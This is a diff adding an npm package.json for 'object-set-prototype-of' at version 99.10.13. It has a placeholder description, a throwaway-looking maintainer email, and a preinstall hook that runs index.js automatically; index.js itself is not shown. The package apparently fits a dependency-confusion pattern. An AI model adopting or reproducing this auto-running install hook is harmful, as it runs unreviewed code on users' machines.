@@ -1,0 +1,39 @@
+{
+    "name": "object-set-prototype-of",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "object-set-prototype-of@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-KImn+eUi9aSyl4mahWF4aPfwckjNKa/nJ8Zff7RG4oU61AEURIu6t2VFupNRjLF/GeqtDfVrIKfVApe1G7zmKQ==",
+        "shasum": "41c9451c95791e60bab9ae8dd9645e3897280ecf",
+        "tarball": "https://registry.npmjs.org/object-set-prototype-of/-/object-set-prototype-of-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5081,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXxACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoeTA/7BisQKGYomqD6oBuzg7ZDR/9Mfrx52+0WcirYwExWNRdZoZ1w\r\n3oO0UpeW/ncdEGyC8NcfElIAVSqM0JIv00F2nLbhygrvUlNsFCht63NKhW6U\r\n+nch/Y9EhQvAh4kNldNyPETYWw19JN3xlaUxynEvuHs0J81FznLH7zwQSBOA\r\nCjVKQZzZlI4WNBdPvbpf3PpybMcqFqYmlaur1UBTksQ+doI0pGlvPQpu1pjK\r\nNXD/jLYzw3DjjyvPvcTGoZ+MBdxn+tS5YlrBKHN5KYSpefvVY5vufIPxhOE8\r\nPUan++MrBr3DfX5xGKWwbY/QJW2FAOc9UgyGfJscpEflXRtkyLxCv2VRSaaZ\r\n3gZj70VVk2m7sfZh5RlsTF0UeBSV3jBQQgKLkCMiqSpX/uoPqZ7I5xEwgtxE\r\nrjhJUSPj7glBTFHEmrSxKP9w1i76aD8e8Jvus7jODLraEqq/JSKJ4u2B7szo\r\nRsYhjMrYcXTe+ttwKwzqRS5VMRaQhV35oySVH0IYUGW3JfAlOySNQ/JDeHOV\r\nofsadWrVFiGbT5Q7N1cRjI94bzrYJASSwk50hTtsGn2g3TqO128IUhf8DtEe\r\nd0bjyDuyxlz5+D+Wud5jEE/GNm+pDIw17XqTyWQHurspF2fCFOtbbfc/iYkA\r\nXGLOZTK0y9h1J8Jd1AOKd1u/oB6VMqq9XbQ=\r\n=EENo\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "phwuquyi",
+        "email": "phwuquyi@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "phwuquyi",
+            "email": "phwuquyi@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/object-set-prototype-of_99.10.13_1648420337496_0.018783742649938207"
+    },
+    "_hasShrinkwrap": false
+}
